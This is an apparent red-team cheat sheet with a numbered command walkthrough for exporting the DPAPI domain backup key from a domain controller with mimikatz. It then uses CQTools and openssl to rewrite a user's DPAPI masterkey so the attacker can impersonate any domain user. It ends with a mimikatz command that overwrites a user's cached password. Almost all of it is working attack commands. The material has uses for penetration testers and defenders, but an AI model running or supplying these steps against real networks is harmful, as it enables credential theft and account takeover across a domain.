## Exporting DPAPI Domain Backup Key with mimikatz, and explaining how to recreate a user's masterkey (AKA Impersonate ANYONE within the domain)

### Tools: Mimikatz, CQTools https://github.com/BlackDiverX/cqtools

### Requirements: System level access on the host

### Steps:

#### 1) mimikatz.exe 

#### 2) lsadump::backupkeys /system:localhost /export (Dump the DPAPI Domain Backup Key from DC)

#### 3) Transfer the .pfx container, as well as some of the CQtools (CQDPAPIBlobSearcher.exe and CQMasterKeyAD.exe to target machine of your choice)

#### 4) CQDPAPIBlobSearcher.exe /d c:\users\USER\AppData\Roaming /r /o c:users\USER\Desktop\blob (Finds the Masterkey, which shown as mkguid on results)

#### 5) Attacking machine: openssl pkcs12 -in DMK.pfx -out temp.pem -nodes (Password is mimikatz because it was extracted with mimikatz from DC)

#### 6) Attacking machine: openssl pkcs12 -export -out DMK.pfx -in temp.pem (Use cqure as passphrase. We repacked the pfx using "cqure" as passphrase to make the cqtool work or else it will fail)

#### 7) CQMasterKeyAD.exe /file "c:\users\USER\appdata\roaming\microsoft\protect\USER_SID\MASTERKEY" /pfx DMK.pfx /newhash NTLM_HASH_OF_USER

#### 8) ren OLD_MASTERKEY_FILE WHATEVER

#### 9) ren NEW_MASTERKEY_FILE OLD_MASTERKEY_FILE

#### 10) attrib "c:\users\USER\appdata\roaming\microsoft\protect\USER_SID\MASTERKEY" +S +H (Shuffle the old and new masterkey files, then give the same attributes to the newly created masterkey file as the old one)

#### 11) VOILA!

## TIP: In case we cannot crack the NTLM password of a user, we can simply create a new password with mimikatz: lsadump::cache /user:USER /password:NEW_PASSWORD /kiwi
